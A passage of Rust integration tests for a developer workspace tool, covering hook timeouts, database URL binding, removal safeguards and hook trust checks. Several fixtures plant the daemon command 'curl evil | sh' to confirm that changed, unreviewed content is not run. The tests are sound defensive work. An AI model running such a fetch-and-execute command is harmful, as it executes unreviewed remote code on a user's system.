        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(back.status, Status::Ready);
    assert_eq!(env_map(&w)["DATABASE_URL"], url);
    assert!(!receipt_of(&w).services["db"].orphaned);
}

#[test]
fn named_hook_tables_run_with_their_names_and_their_own_timeouts() {
    let t = plain();
    let project = edit_config(&t, |text| {
        text.replace(
            "setup = []",
            "setup = [\n  'echo plain',\n  { name = \"migrate\", run = 'echo migrating' },\n  \
             { name = \"seed\", run = 'sleep 30', timeout = \"300ms\" },\n  \
             'touch .devflow/never',\n]",
        )
    });
    assert_eq!(project.config.hooks.setup.len(), 4);
    trust::approve(&project).unwrap();
    let mut rec = Recorder::default();
    let started = std::time::Instant::now();
    let out = setup::create(
        &project,
        CreateRequest {
            name: "w".into(),
            from: None,
            base: None,
            options: SetupOptions::default(),
        },
        &mut rec,
    )
    .unwrap();
    assert!(
        started.elapsed() < std::time::Duration::from_secs(25),
        "the entry's 300ms timeout applies, not the section's 15m"
    );
    assert_eq!(out.status, Status::NeedsAttention);
    let report = out.hooks.as_ref().unwrap();
    assert!(!report.ok);
    let names: Vec<_> = report.runs.iter().map(|r| r.name.as_deref()).collect();
    assert_eq!(names, [None, Some("migrate"), Some("seed")]);
    assert!(report.runs[2].timed_out, "{:?}", report.runs[2]);
    assert!(!out.workspace.path.join(".devflow/never").exists());
    let hooks = out.receipt.phase(Phase::Hooks);
    assert_eq!(hooks.state, PhaseState::Failed);
    assert!(
        hooks
            .detail
            .unwrap()
            .contains("setup hook 'seed' (`sleep 30`) timed out"),
    );
    // Output and log announce the named entries.
    assert!(
        rec.lines
            .contains(&"[migrate] $ echo migrating".to_string()),
        "{:?}",
        rec.lines
    );
    assert!(rec.lines.contains(&"$ echo plain".to_string()));
    let log = std::fs::read_to_string(report.log.as_ref().unwrap()).unwrap();
    assert!(log.contains("[seed] $ sleep 30"), "{log}");
}

#[test]
fn a_version_one_binding_without_a_postgres_service_is_reported_not_guessed() {
    let t = plain();
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let out = create(
        &t.project,
        "old",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    let w = out.workspace.clone();
    assert_eq!(env_map(&w)["DATABASE_URL"], url, "version 1 exported it");
    downgrade_to_v1(&w);

    let listed = &setup::list(&t.project).unwrap()[1];
    let seen = listed.receipt.as_ref().unwrap();
    assert!(seen.services.is_empty());
    assert_eq!(seen.unmapped.as_ref().map(|d| d.url.as_str()), Some(url));
    assert_eq!(
        listed.status,
        Some(Status::NeedsAttention),
        "the old environment still exports the binding"
    );
    let again = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert!(
        again.warnings.iter().any(|w| w.contains("unmapped")),
        "{:?}",
        again.warnings
    );
    assert_eq!(again.status, Status::Ready);
    let env = env_map(&w);
    assert!(
        !env.contains_key("DATABASE_URL") && !env.contains_key("PGHOST"),
        "the database is no longer exported: {env:?}"
    );
    let stored = receipt_of(&w);
    assert_eq!(stored.version, 2);
    assert_eq!(stored.unmapped.as_ref().map(|d| d.url.as_str()), Some(url));
}

#[test]
fn database_url_attaches_without_provisioning_and_is_detach_only() {
    let t = plain();
    let url = "postgres://dfl_x:p%40ss@db.internal:6543/df_proj_x?sslmode=require";
    let out = create(
        &t.project,
        "sandbox",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    let binding = binding(&out.receipt);
    assert_eq!(binding.branch_id, None);
    assert!(!binding.owned);
    assert_eq!(binding.source, "url");
    assert_eq!(binding.url, url);
    assert_eq!(
        (binding.database.as_str(), binding.role.as_str()),
        ("df_proj_x", "dfl_x")
    );

    let env = env_map(&out.workspace);
    assert_eq!(env["DATABASE_URL"], url);
    assert_eq!(env["PGHOST"], "db.internal");
    assert_eq!(env["PGPORT"], "6543");
    assert_eq!(env["PGUSER"], "dfl_x");
    assert_eq!(env["PGPASSWORD"], "p@ss");
    assert_eq!(env["PGDATABASE"], "df_proj_x");

    // Attachments can be neither reset nor snapshotted, and removal never drops anything.
    let w = out.workspace;
    let error = setup::reset_data(&t.project, &w, None).unwrap_err();
    assert!(error.to_string().contains("URL only"), "{error:#}");
    assert!(setup::snapshot(&t.project, &w, "seed").is_err());
    let removed = setup::remove(
        &t.project,
        "sandbox",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(removed.dropped_branch, None);
    assert!(!w.path.exists());

    assert!(
        create(
            &t.project,
            "bad",
            SetupOptions {
                database_url: Some("mysql://x/y".into()),
                ..Default::default()
            }
        )
        .is_err()
    );
}

#[test]
fn no_db_skips_the_database_even_with_a_url() {
    let t = plain();
    let out = create(
        &t.project,
        "nodb",
        SetupOptions {
            no_db: true,
            database_url: Some("postgres://u:p@h/d".into()),
            ..Default::default()
        },
    )
    .unwrap();
    assert!(out.receipt.services.is_empty());
    assert_eq!(
        out.receipt.phase(Phase::Services).state,
        PhaseState::Skipped
    );
}

#[test]
fn path_collisions_are_refused_without_side_effects() {
    let t = plain();
    create(&t.project, "feature/a", SetupOptions::default()).unwrap();
    let error = create(&t.project, "feature-a", SetupOptions::default()).unwrap_err();
    assert!(error.to_string().contains("already exists"), "{error:#}");
    assert_eq!(worktree::list(&t.project).unwrap().len(), 2);
    assert!(
        t.project
            .repo()
            .unwrap()
            .find_branch("feature-a", git2::BranchType::Local)
            .is_err()
    );
    // A plain directory in the way is refused too, and left untouched.
    let blocked = worktree::path_for(&t.project, "taken");
    std::fs::create_dir_all(&blocked).unwrap();
    std::fs::write(blocked.join("mine.txt"), "keep").unwrap();
    assert!(create(&t.project, "taken", SetupOptions::default()).is_err());
    assert_eq!(
        std::fs::read_to_string(blocked.join("mine.txt")).unwrap(),
        "keep"
    );
}

#[test]
fn remove_checks_every_protection_before_any_effect() {
    let marker_dir = tempfile::tempdir().unwrap();
    let marker = marker_dir.path().join("teardown-ran");
    let teardown = format!("touch {}", marker.display());
    let t = repo(
        &Hooks {
            teardown: &[&teardown],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "guarded", SetupOptions::default())
        .unwrap()
        .workspace;
    let remove = |name: &str, options: RemoveOptions| {
        setup::remove(&t.project, name, options, &mut NoProgress)
    };
    let still_there = || {
        assert!(w.path.exists(), "workspace must survive a refusal");
        assert!(
            !marker.exists(),
            "teardown must not run before the protections pass"
        );
    };

    // The default workspace, even forced.
    let error = remove(
        "main",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
    )
    .unwrap_err();
    assert!(error.to_string().contains("default workspace"), "{error:#}");
    assert!(!protection(&error).forceable);
    assert_eq!(protection(&error).workspace, "main");
    assert!(t.root.join("README.md").is_file());

    // The caller's directory, even forced and from a subdirectory.
    let sub = w.path.join("src/deep");
    std::fs::create_dir_all(&sub).unwrap();
    for force in [false, true] {
        let error = remove(
            "guarded",
            RemoveOptions {
                force,
                cwd: Some(sub.clone()),
                ..Default::default()
            },
        )
        .unwrap_err();
        assert!(error.to_string().contains("current directory"), "{error:#}");
        assert!(
            !protection(&error).forceable,
            "--force cannot override this"
        );
        still_there();
    }

    // Dirty needs --force.
    std::fs::write(w.path.join("wip.txt"), "x").unwrap();
    let error = remove("guarded", RemoveOptions::default()).unwrap_err();
    assert!(error.to_string().contains("uncommitted"), "{error:#}");
    assert!(protection(&error).forceable);
    still_there();
    std::fs::remove_file(w.path.join("wip.txt")).unwrap();
    std::fs::remove_dir_all(w.path.join("src")).unwrap();

    // Locked needs --force.
    t.project
        .repo()
        .unwrap()
        .find_worktree("guarded")
        .unwrap()
        .lock(Some("busy"))
        .unwrap();
    let error = remove("guarded", RemoveOptions::default()).unwrap_err();
    assert!(error.to_string().contains("locked"), "{error:#}");
    assert!(protection(&error).forceable);
    still_there();
    t.project
        .repo()
        .unwrap()
        .find_worktree("guarded")
        .unwrap()
        .unlock()
        .unwrap();

    // Untrusted teardown hooks refuse (they would otherwise run unreviewed code).
    let changed = edit_config(&t, |text| {
        text.replace("teardown = ['", "teardown = ['echo more', '")
    });
    let error = setup::remove(
        &changed,
        "guarded",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(error.to_string().contains("not trusted"), "{error:#}");
    assert!(protection(&error).forceable);
    still_there();
    // The recipes go back to what was approved.
    edit_config(&t, |text| {
        text.replace("teardown = ['echo more', '", "teardown = ['")
    });

    // Unmerged branches are protected up front when deleting the branch.
    let repo = git2::Repository::open(&w.path).unwrap();
    std::fs::write(w.path.join("feature.txt"), "x").unwrap();
    commit_all(&repo, "feature work");
    let error = remove(
        "guarded",
        RemoveOptions {
            delete_branch: true,
            ..Default::default()
        },
    )
    .unwrap_err();
    assert!(
        error.to_string().contains("not in the default workspace"),
        "{error:#}"
    );
    assert!(protection(&error).forceable);
    still_there();

    // With everything satisfied it goes: teardown first, then the worktree; branch kept by default.
    let out = remove("guarded", RemoveOptions::default()).unwrap();
    assert!(marker.exists(), "teardown ran");
    assert!(out.hooks.unwrap().ok);
    assert!(!w.path.exists());
    assert!(!w.git_dir.exists());
    assert!(!out.deleted_branch && out.dropped_branch.is_none());
    assert!(
        t.project
            .repo()
            .unwrap()
            .find_branch("guarded", git2::BranchType::Local)
            .is_ok()
    );
}

#[test]
fn teardown_failure_blocks_removal_unless_forced() {
    let t = repo(
        &Hooks {
            teardown: &["echo cleaning; exit 5"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "stuck", SetupOptions::default())
        .unwrap()
        .workspace;
    let mut rec = Recorder::default();
    let error = setup::remove(&t.project, "stuck", RemoveOptions::default(), &mut rec).unwrap_err();
    assert!(error.to_string().contains("exit 5"), "{error:#}");
    // The hook ran before it failed, so this is no preflight refusal: the
    // removal stopped part-way, and says what was done and what remains.
    let partial = error
        .downcast_ref::<devflow_core::error::PartialRemoval>()
        .unwrap_or_else(|| panic!("not a partial removal: {error:#}"));
    assert!(partial.forceable, "--force removes it anyway");
    assert!(
        partial.done.iter().any(|d| d.contains("teardown hooks")),
        "{partial:?}"
    );
    assert!(
        partial
            .remains
            .iter()
            .any(|r| r.starts_with("the worktree"))
            && partial.remains.iter().any(|r| r.contains("receipt")),
        "{partial:?}"
    );
    assert!(
        partial
            .remedies
            .iter()
            .any(|r| matches!(r, devflow_core::remedy::Remedy::RemoveWorkspace { .. })),
        "{:?}",
        partial.remedies
    );
    assert!(w.path.exists(), "removal was blocked");
    assert!(rec.lines.iter().any(|l| l == "cleaning"));

    let out = setup::remove(
        &t.project,
        "stuck",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(!w.path.exists());
    assert!(!out.hooks.unwrap().ok);
    assert!(
        out.warnings.iter().any(|w| w.contains("exit 5")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn forced_removal_handles_dirty_locked_untrusted_and_deletes_branches() {
    let t = repo(
        &Hooks {
            teardown: &["touch ../teardown-ran"],
            ..Default::default()
        },
        "",
    );
    let w = create(&t.project, "doomed", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::write(w.path.join("wip.txt"), "x").unwrap();
    t.project
        .repo()
        .unwrap()
        .find_worktree("doomed")
        .unwrap()
        .lock(None)
        .unwrap();
    let out = setup::remove(
        &t.project,
        "doomed",
        RemoveOptions {
            force: true,
            delete_branch: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(!w.path.exists());
    assert!(
        out.hooks.is_none(),
        "untrusted teardown hooks are skipped under --force"
    );
    assert!(
        out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );
    assert!(out.deleted_branch);
    assert!(
        t.project
            .repo()
            .unwrap()
            .find_branch("doomed", git2::BranchType::Local)
            .is_err()
    );
    assert!(!w.path.parent().unwrap().join("teardown-ran").exists());
}

#[test]
fn removing_a_merged_branch_and_a_vanished_directory() {
    let t = plain();
    let a = create(&t.project, "merged", SetupOptions::default())
        .unwrap()
        .workspace;
    let out = setup::remove(
        &t.project,
        "merged",
        RemoveOptions {
            delete_branch: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        out.deleted_branch,
        "no commits of its own, so it counts as merged"
    );
    assert!(!a.path.exists());

    let b = create(&t.project, "vanished", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::remove_dir_all(&b.path).unwrap();
    assert!(
        setup::list(&t.project)
            .unwrap()
            .iter()
            .any(|s| s.workspace.missing)
    );
    setup::remove(
        &t.project,
        "vanished",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(worktree::list(&t.project).unwrap().len(), 1);
    assert!(
        setup::remove(
            &t.project,
            "vanished",
            RemoveOptions::default(),
            &mut NoProgress
        )
        .is_err()
    );
}

#[test]
fn switch_runs_switch_hooks_each_time_but_only_when_trusted_and_ready() {
    let t = repo(
        &Hooks {
            switch: &["echo switched >> .devflow/switch.log"],
            ..Default::default()
        },
        "",
    );
    let w = create(&t.project, "hop", SetupOptions::default())
        .unwrap()
        .workspace;
    let log = w.path.join(".devflow/switch.log");

    // Untrusted: a warning, not a failure.
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.switch_hooks.is_none());
    assert!(
        out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );
    assert!(!log.exists());

    trust::approve(&t.project).unwrap();
    for _ in 0..2 {
        let out =
            setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
        assert!(out.warnings.is_empty(), "{:?}", out.warnings);
        assert!(out.switch_hooks.unwrap().ok);
        assert!(
            out.hooks.is_none(),
            "`hooks` is the setup run's, which did not run"
        );
    }
    assert_eq!(
        std::fs::read_to_string(&log).unwrap(),
        "switched\nswitched\n"
    );
    let out = setup::activate(
        &t.project,
        &w,
        SetupOptions {
            no_hooks: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.switch_hooks.is_none());
    assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 2);

    // A failing switch hook is a warning with the report attached.
    let failing = edit_config(&t, |text| {
        text.replace(
            "switch = ['echo switched >> .devflow/switch.log']",
            "switch = ['exit 9']",
        )
    });
    trust::approve(&failing).unwrap();
    let out = setup::activate(&failing, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("exit 9") || w.contains("code 9")),
        "{:?}",
        out.warnings
    );
    assert!(!out.switch_hooks.unwrap().ok);
    assert_eq!(
        out.status,
        Status::Ready,
        "switch hooks never poison the receipt"
    );
}

#[test]
fn switch_resumes_an_incomplete_setup_first() {
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/setup-ran"],
            switch: &["touch .devflow/switch-ran"],
            ..Default::default()
        },
        "",
    );
    let w = create(&t.project, "later", SetupOptions::default())
        .unwrap()
        .workspace;
    assert!(!w.path.join(".devflow/setup-ran").exists());
    trust::approve(&t.project).unwrap();
    let out = setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(w.path.join(".devflow/setup-ran").exists());
    assert!(w.path.join(".devflow/switch-ran").exists());
}

#[test]
fn trust_is_judged_by_the_target_workspaces_pitchfork_files_not_the_main_checkouts() {
    let t = repo(
        &Hooks {
            switch: &["echo switched >> .devflow/switch.log"],
            teardown: &["touch ../teardown-ran"],
            ..Default::default()
        },
        "",
    );
    let main = git2::Repository::open(&t.root).unwrap();
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\n",
    )
    .unwrap();
    commit_all(&main, "add the api daemon");
    // The main checkout is what gets approved.
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "feature", SetupOptions::default())
        .unwrap()
        .workspace;
    let log = w.path.join(".devflow/switch.log");
    let switch = || setup::activate(&t.project, &w, SetupOptions::default(), &mut NoProgress);
    let out = switch().unwrap();
    assert!(out.switch_hooks.is_some(), "{:?}", out.warnings);
    assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 1);

    // The linked worktree's daemon changes (and is committed there).
    std::fs::write(
        w.path.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    commit_all(
        &git2::Repository::open(&w.path).unwrap(),
        "change the daemon",
    );
    assert_eq!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Trusted,
        "the main checkout is untouched"
    );
    assert!(matches!(
        trust::state_at(&t.project, &w.path).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
    assert_ne!(
        trust::digest_at(&t.project, &w.path),
        trust::digest(&t.project)
    );

    // Switch hooks do not run in the worktree on the main checkout's approval.
    let out = switch().unwrap();
    assert!(out.switch_hooks.is_none());
    assert!(
        out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );
    assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 1);
    // Neither does teardown.
    let error = setup::remove(
        &t.project,
        "feature",
        RemoveOptions {
            pitchfork: Some(quiet_pitchfork()),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        protection(&error)
            .reason
            .contains("teardown hooks are not trusted"),
        "{error:#}"
    );
    assert!(w.path.exists() && !t.root.parent().unwrap().join("teardown-ran").exists());

    // Approving what the worktree asks to run lets them run there.
    let reviewed = trust::scope_at(&t.project, &w.path);
    trust::approve_scope_at(&t.project, &w.path, &reviewed).unwrap();
    let out = switch().unwrap();
    assert!(out.switch_hooks.is_some(), "{:?}", out.warnings);
    assert_eq!(std::fs::read_to_string(&log).unwrap().lines().count(), 2);
}

/// A repository whose main checkout has a daemon, plus a local branch
/// `feature` that was committed with another one: the existing-branch case of
/// `switch -c feature`.
fn repo_with_a_branch_of_other_processes() -> Repo {
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/setup-ran"],
            ..Default::default()
        },
        "[env]\nREVIEWED = \"1\"\n",
    );
    let git = git2::Repository::open(&t.root).unwrap();
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\n",
    )
    .unwrap();
    commit_all(&git, "the daemon everyone reviewed");
    let reviewed = git.head().unwrap().peel_to_commit().unwrap();
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    commit_all(&git, "another daemon on the branch");
    let other = git.head().unwrap().peel_to_commit().unwrap();
    git.branch("feature", &other, false).unwrap();
    git.reset(reviewed.as_object(), git2::ResetType::Hard, None)
        .unwrap();
    t
}

#[test]
fn an_approval_of_the_source_scope_runs_nothing_in_a_target_that_holds_other_processes() {
    let t = repo_with_a_branch_of_other_processes();
    // What the person reviewed and approved for this one run: the main
    // checkout's scope (the workspace the new one is made from).
    let reviewed = trust::scope(&t.project);
    let approval = Some(trust::Approval::of(&reviewed));
    let options = SetupOptions {
        approval: approval.clone(),
        ..Default::default()
    };

    let out = create(&t.project, "feature", options).unwrap();
    assert_eq!(
        out.status,
        Status::NeedsAttention,
        "{:?}",
        out.receipt.phases
    );
    assert!(out.approval_differs);
    assert!(
        !out.workspace.path.join(".devflow/setup-ran").exists(),
        "the setup hook did not run on the strength of another scope"
    );
    assert!(out.hooks.is_none());
    for phase in [Phase::Env, Phase::Hooks] {
        let record = out.receipt.phase(phase);
        assert!(
            record.required_skip
                && record
                    .detail
                    .as_deref()
                    .is_some_and(|d| d.contains("differs from what you reviewed")),
            "{phase:?}: {record:?}"
        );
    }
    assert!(
        !env_map(&out.workspace).contains_key("REVIEWED"),
        "the [env] recipes were not applied"
    );
    assert!(matches!(
        trust::state_at(&t.project, &out.workspace.path).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
    // Nothing was stored either.
    assert!(matches!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Untrusted {
            previously_trusted: false,
            ..
        }
    ));

    // The same approval resumes nothing: still another scope.
    let again = setup::setup(
        &t.project,
        &out.workspace,
        SetupOptions {
            approval,
            ..Default::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert!(again.approval_differs);
    assert!(!again.workspace.path.join(".devflow/setup-ran").exists());

    // Reviewing what the workspace actually holds is what lets it run.
    let own = trust::scope_at(&t.project, &out.workspace.path);
    assert_ne!(own.digest, reviewed.digest);
    let resumed = setup::setup(
        &t.project,
        &out.workspace,
        SetupOptions {
            approval: Some(trust::Approval::of(&own)),
            ..Default::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        resumed.status,
        Status::Ready,
        "{:?}",
        resumed.receipt.phases
    );
    assert!(!resumed.approval_differs);
    assert!(resumed.workspace.path.join(".devflow/setup-ran").exists());
    assert_eq!(env_map(&resumed.workspace)["REVIEWED"], "1");
}

#[test]
fn an_approval_of_the_source_scope_runs_in_a_target_with_the_same_scope() {
    let t = repo_with_a_branch_of_other_processes();
    let approval = Some(trust::Approval::of(&trust::scope(&t.project)));
    let out = create(
        &t.project,
        "same",
        SetupOptions {
            approval,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert!(!out.approval_differs);
    assert!(out.workspace.path.join(".devflow/setup-ran").exists());
    assert_eq!(env_map(&out.workspace)["REVIEWED"], "1");
}

#[test]
fn switch_hooks_and_teardown_are_refused_on_an_approval_of_other_content() {
    let t = repo(
        &Hooks {
            switch: &["echo switched >> .devflow/switch.log"],
            teardown: &["touch ../teardown-ran"],
            ..Default::default()
        },
        "",
    );
    let main = git2::Repository::open(&t.root).unwrap();
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\n",
    )
    .unwrap();
    commit_all(&main, "daemon");
    let w = create(&t.project, "feature", SetupOptions::default())
        .unwrap()
        .workspace;
    // Another pitchfork file in the worktree than the one that was reviewed.
    std::fs::write(
        w.path.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    commit_all(&git2::Repository::open(&w.path).unwrap(), "other daemon");
    let approval = Some(trust::Approval::of(&trust::scope(&t.project)));
    let out = setup::activate(
        &t.project,
        &w,
        SetupOptions {
            approval: approval.clone(),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.hooks.is_none());
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("differs from what you reviewed")),
        "{:?}",
        out.warnings
    );
    assert!(!w.path.join(".devflow/switch.log").exists());

    let error = setup::remove(
        &t.project,
        "feature",
        RemoveOptions {
            approval,
            pitchfork: Some(quiet_pitchfork()),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(protection(&error).forceable, "{error:#}");
    assert!(
        protection(&error)
            .reason
            .contains("differs from what you reviewed"),
        "{error:#}"
    );
    assert!(w.path.exists() && !t.root.parent().unwrap().join("teardown-ran").exists());
}

#[test]
fn project_without_postgres_has_no_database_operations() {
    let t = plain();
    let w = create(&t.project, "nodatabase", SetupOptions::default())
        .unwrap()
        .workspace;
    assert!(setup::reset_data(&t.project, &w, None).is_err());
    assert!(setup::snapshot(&t.project, &w, "seed").is_err());
    assert!(setup::snapshot(&t.project, &w, "bad name").is_err());
}

#[test]
fn env_vars_include_database_entries_only_when_bound() {
    let t = plain();
    let w = create(&t.project, "vars", SetupOptions::default()).unwrap();
    let vars = setup::env_vars(&t.project, &w.workspace, &w.receipt);
    let keys: Vec<_> = vars.iter().map(|(k, _)| k.as_str()).collect();
    assert_eq!(
        keys,
        [
            "DEVFLOW_PROJECT",
            "DEVFLOW_PROJECT_ROOT",
            "DEVFLOW_WORKSPACE",
            "DEVFLOW_WORKSPACE_PATH",
            "DEVFLOW_SOURCE_PATH",
            "DEVFLOW_WORKSPACE_ID",
            "COMPOSE_PROJECT_NAME",
            // The workspace's own port, chosen when its env phase ran.
            "DEVFLOW_PORT",
        ]
    );
    // Every generated name is one a recipe may reference (and none can be set).
    for key in &keys {
        assert!(
            env_file::is_generated(key) && env_file::is_reserved(key),
            "{key}"
        );
    }
    // The default workspace has no source path.
    let default = worktree::list(&t.project).unwrap().remove(0);
    let receipt = Receipt::new(t.project.id(), &default.name, None);
    let keys: Vec<_> = setup::env_vars(&t.project, &default, &receipt)
        .into_iter()
        .map(|(k, _)| k)
        .collect();
    assert!(!keys.contains(&"DEVFLOW_SOURCE_PATH".to_string()));
}

#[test]
fn doctor_reports_a_workspace_that_needs_attention() {
    let t = repo(
        &Hooks {
            setup: &["true"],
            ..Default::default()
        },
        "",
    );
    create(&t.project, "pending", SetupOptions::default()).unwrap();
    let checks = devflow_core::doctor::run(Some(&t.project));
    let workspaces: Vec<_> = checks.iter().filter(|c| c.name == "workspaces").collect();
    assert!(
        workspaces.iter().any(|c| c.detail.contains("pending")),
        "{workspaces:?}"
    );
    let trust = checks.iter().find(|c| c.name == "hook-trust").unwrap();
    assert_eq!(trust.status, devflow_core::doctor::CheckStatus::Warn);
}

#[test]
fn removing_a_vanished_workspace_never_deletes_what_replaced_it() {
    let marker_dir = tempfile::tempdir().unwrap();
    let marker = marker_dir.path().join("teardown-ran");
    let teardown = format!("touch {}", marker.display());
    let t = repo(
        &Hooks {
            teardown: &[&teardown],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "vanished", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::remove_dir_all(&w.path).unwrap();
    // An ordinary directory is created at the same path.
    std::fs::create_dir_all(w.path.join("src")).unwrap();
    std::fs::write(w.path.join("src/precious.txt"), "keep").unwrap();
    assert!(ws(&t.project, "vanished").missing);

    for force in [false, true] {
        let error = setup::remove(
            &t.project,
            "vanished",
            RemoveOptions {
                force,
                ..Default::default()
            },
            &mut NoProgress,
        )
        .unwrap_err();
        let refusal = protection(&error);
        assert!(!refusal.forceable, "{refusal}");
        assert_eq!(refusal.workspace, "vanished");
        assert!(error.to_string().contains("not the checkout"), "{error:#}");
        assert_eq!(
            std::fs::read_to_string(w.path.join("src/precious.txt")).unwrap(),
            "keep",
            "force={force}"
        );
        assert!(!marker.exists());
        assert!(
            worktree::find(&t.project, "vanished").unwrap().is_some(),
            "the registration is left for the user to resolve"
        );
    }

    // Once the path is really free only the registration goes.
    std::fs::remove_dir_all(&w.path).unwrap();
    setup::remove(
        &t.project,
        "vanished",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(worktree::find(&t.project, "vanished").unwrap().is_none());
    assert!(!w.git_dir.exists());
    assert!(!w.path.exists(), "nothing was created in its place either");
}

fn expecting(w: &Workspace, instance_id: Option<uuid::Uuid>) -> setup::ExpectedWorkspace {
    setup::ExpectedWorkspace {
        path: w.path.clone(),
        instance_id,
        fingerprint: w.fingerprint.clone(),
        missing: false,
    }
}

#[test]
fn removal_is_refused_when_the_workspace_is_not_the_one_that_was_shown() {
    let marker_dir = tempfile::tempdir().unwrap();
    let marker = marker_dir.path().join("teardown-ran");
    let teardown = format!("touch {}", marker.display());
    let t = repo(
        &Hooks {
            teardown: &[&teardown],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let remove = |project: &Project, expect: Option<setup::ExpectedWorkspace>, force: bool| {
        setup::remove(
            project,
            "doc",
            RemoveOptions {
                force,
                expect,
                ..Default::default()
            },
            &mut NoProgress,
        )
    };
    let refused = |error: &anyhow::Error| {
        let refusal = protection(error);
        assert!(
            !refusal.forceable,
            "--force must not override this: {refusal}"
        );
        assert!(
            error.to_string().contains("changed since it was shown"),
            "{error:#}"
        );
    };

    // The view the user had: `doc` at one path with one receipt.
    let shown = create(&t.project, "doc", SetupOptions::default()).unwrap();
    let view = expecting(&shown.workspace, Some(shown.receipt.instance_id));

    // Recreated at the same path with a new receipt (a new instance).
    remove(&t.project, None, false).unwrap();
    assert!(marker.exists());
    std::fs::remove_file(&marker).unwrap();
    let again = create(&t.project, "doc", SetupOptions::default()).unwrap();
    assert_eq!(again.workspace.path, shown.workspace.path);
    assert_ne!(again.receipt.instance_id, shown.receipt.instance_id);
    for force in [false, true] {
        let error = remove(&t.project, Some(view.clone()), force).unwrap_err();
        refused(&error);
        assert!(error.to_string().contains("receipt"), "{error:#}");
        assert!(again.workspace.path.exists());
        assert!(!marker.exists(), "no teardown before the check");
    }

    // Recreated at another path.
    remove(&t.project, None, false).unwrap();
    std::fs::remove_file(&marker).unwrap();
    let mut moved = t.project.clone();
    moved.config.worktree.dir = t
        .root
        .parent()
        .unwrap()
        .join("elsewhere")
        .to_string_lossy()
        .into_owned();
    let elsewhere = create(&moved, "doc", SetupOptions::default()).unwrap();
    assert_ne!(elsewhere.workspace.path, shown.workspace.path);
    let same_receipt = expecting(&shown.workspace, Some(elsewhere.receipt.instance_id));
    for force in [false, true] {
        let error = remove(&moved, Some(same_receipt.clone()), force).unwrap_err();
        refused(&error);
        assert!(
            error
                .to_string()
                .contains(&elsewhere.workspace.path.display().to_string()),
            "{error:#}"
        );
        assert!(elsewhere.workspace.path.exists());
        assert!(!marker.exists());
    }

    // `None` means "had no receipt", and means it both ways.
    let bare = worktree::create(&moved, "bare", None).unwrap();
    let bare_remove = |expect: setup::ExpectedWorkspace| {
        setup::remove(
            &moved,
            "bare",
            RemoveOptions {
                expect: Some(expect),
                ..Default::default()
            },
            &mut NoProgress,
        )
